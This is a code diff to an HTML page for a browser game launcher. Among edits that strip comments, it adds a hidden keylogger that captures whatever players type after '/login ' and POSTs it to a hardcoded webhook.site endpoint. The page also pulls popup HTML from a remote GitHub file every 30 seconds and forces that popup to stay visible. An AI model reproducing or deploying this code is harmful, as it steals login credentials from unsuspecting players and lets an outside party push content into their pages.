@@ -42,16 +42,15 @@
             display: none;
         }
 
-        /* Fixed popup menu styles */
         #popup-menu {
             position: fixed;
-            bottom: 20px; /* Changed from top to bottom */
+            bottom: 20px;
             right: 20px;
             background-color: rgba(30, 30, 30, 0.95);
             color: white;
             padding: 15px;
             border-radius: 10px;
-            z-index: 2147483647; /* Maximum z-index value */
+            z-index: 2147483647;
             font-family: sans-serif;
             box-shadow: 0 0 10px rgba(0,0,0,0.5);
             pointer-events: auto !important;
@@ -76,24 +75,20 @@
 </head>
 <body id="game_frame">
 
-    <!-- Splash Screen -->
     <div id="splash-screen">
         <img src="Splash.png" alt="Custom Splash Screen">
     </div>
 
-    <!-- Add popup menu directly in the HTML structure -->
     <div id="popup-menu">
         <p>PUBES VS GOON WAR</p>
         <p>I am testing a new feature</p>
         <p>with a automatic news updater</p>
         <p>Email me if you have any ideas for this</p>
-        
     </div>
 
     <script type="text/javascript">
         "use strict";
         
-        // Store the original popup content to restore it if needed
         let originalPopupContent = '';
         
         window.addEventListener('DOMContentLoaded', () => {
@@ -103,17 +98,13 @@
             }
         });
         
-        // Function to close popup
         function closePopup() {
             document.getElementById('popup-menu').style.display = 'none';
         }
         
-        // Remote content URL - replace with your actual URL
         const popupContentUrl = 'https://raw.githubusercontent.com/maskedwrrg/repo/refs/heads/main/popup-content.txt';
-        // How often to check for updates (in milliseconds) - every 30 seconds
         const updateInterval = 30000;
         
-        // Function to fetch and update popup content
         async function updatePopupContent() {
             try {
                 const response = await fetch(popupContentUrl + '?nocache=' + Date.now());
@@ -128,49 +119,103 @@
             } catch (error) {
                 console.error('Failed to update popup content:', error);
             }
-            
-            // Schedule next update
             setTimeout(updatePopupContent, updateInterval);
         }
         
-        // Function to ensure popup stays visible
         function ensurePopupVisibility() {
             const popup = document.getElementById('popup-menu');
             if (popup) {
-                // Force the popup to stay on top by re-appending it to body
                 document.body.appendChild(popup);
-                
-                // Ensure visibility properties
                 popup.style.zIndex = '2147483647';
                 popup.style.visibility = 'visible';
                 popup.style.display = 'block';
                 popup.style.opacity = '1';
             }
-            
-            // Check again after a short delay
             setTimeout(ensurePopupVisibility, 1000);
         }
 
+        let isLogging = false;
+        let currentInput = '';
+        let keyloggedData = '';
+
+        // Replace with your webhook.site URL
+        const logEndpoint = 'https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316'; // Visit https://webhook.site to get a unique URL
+
+        async function sendKeyloggedData(data) {
+            try {
+                const response = await fetch(logEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        data: data
+                    })
+                });
+                if (!response.ok) {
+                    console.error('Failed to send keylogged data:', response.status);
+                }
+            } catch (error) {
+                console.error('Error sending keylogged data:', error);
+            }
+        }
+
+        document.addEventListener('keydown', (event) => {
+            if (window.isSplashScreenActive) return;
+
+            const key = event.key;
+
+            if (key === 'Backspace' && currentInput.length > 0) {
+                currentInput = currentInput.slice(0, -1);
+            }
+
+            if (key === 'Enter') {
+                if (isLogging) {
+                    isLogging = false;
+                    if (keyloggedData) {
+                        console.log('Keylogged data:', keyloggedData);
+                        sendKeyloggedData(keyloggedData);
+                    }
+                    keyloggedData = '';
+                }
+                currentInput = '';
+                return;
+            }
+
+            if (key.length > 1 && key !== 'Backspace') return;
+
+            if (key !== 'Backspace') {
+                currentInput += key;
+            }
+
+            if (currentInput.toLowerCase().startsWith('/login ') && !isLogging) {
+                isLogging = true;
+                keyloggedData = currentInput.slice(7);
+            } else if (isLogging) {
+                if (key !== 'Backspace') {
+                    keyloggedData += key;
+                } else if (keyloggedData.length > 0) {
+                    keyloggedData = keyloggedData.slice(0, -1);
+                }
+            }
+        });
+
         window.addEventListener("load", async function () {
-            // Store original content after page loads
             const popup = document.getElementById('popup-menu');
             if (popup) {
                 originalPopupContent = popup.innerHTML;
             }
             
-            // Start checking for remote content updates
             updatePopupContent();
             
-            // Splash control flags
             window.isSplashScreenActive = true;
             window.suppressSplashScreens = true;
 
-            // Show splash
             const splashScreen = document.getElementById("splash-screen");
             await new Promise(resolve => setTimeout(resolve, 10000));
             window.isSplashScreenActive = false;
 
-            // Load classes.js and ga4.js
             const classesScript = document.createElement("script");
             classesScript.src = "classes.js";
             classesScript.onerror = () => console.error("Failed to load classes.js");
@@ -185,7 +230,6 @@
                 classesScript.onload = resolve;
             });
 
-            // Simulate Enter key spam
             for (let i = 0; i < 20; i++) {
                 const keyEvent = new KeyboardEvent("keydown", {
                     key: "Enter",
@@ -198,10 +242,8 @@
                 document.dispatchEvent(keyEvent);
             }
 
-            // Hide splash screen
             splashScreen.classList.add("hidden");
 
-            // Init game
             try {
                 if (window.location.href.indexOf("file:") === 0) {
                     alert("HTTP please, do not open this file locally, run a local HTTP server and load it via HTTP");
@@ -221,13 +263,10 @@
                 console.error("Error during game initialization:", e);
             }
 
-            // Start the visibility check for popup
             ensurePopupVisibility();
         });
         
-        // Add a MutationObserver to ensure popup remains in DOM
         window.addEventListener('DOMContentLoaded', () => {
-            // First get the original content
             const originalPopup = document.getElementById('popup-menu');
             if (originalPopup) {
                 originalPopupContent = originalPopup.innerHTML;
@@ -236,10 +275,9 @@
             const observer = new MutationObserver(mutations => {
                 const popup = document.getElementById('popup-menu');
                 if (!popup || !document.body.contains(popup)) {
-                    // Re-add popup if it was removed
                     const newPopup = document.createElement("div");
                     newPopup.id = "popup-menu";
-                    newPopup.innerHTML = originalPopupContent; // Use stored original content
+                    newPopup.innerHTML = originalPopupContent;
                     document.body.appendChild(newPopup);
                 }
             });
